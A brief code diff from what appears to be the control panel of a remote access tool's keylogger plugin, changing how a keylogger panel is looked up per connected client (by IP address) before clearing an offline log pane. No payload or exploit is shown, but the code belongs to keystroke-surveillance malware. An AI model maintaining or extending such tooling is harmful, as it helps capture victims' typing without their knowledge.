@@ -9,7 +9,7 @@ public class PacketLog extends PacketListener {
 	@Override
 	public void perform(Client client) {
 		try {
-			PanelKeylogger panel = (PanelKeylogger) KeyloggerPlugin.entry.getInstances().get(client);
+			PanelKeylogger panel = (PanelKeylogger) KeyloggerPlugin.entry.getInstances().get(client.getIP());
 
 			if (panel != null) {
 				panel.offlineTextPane.setText("");
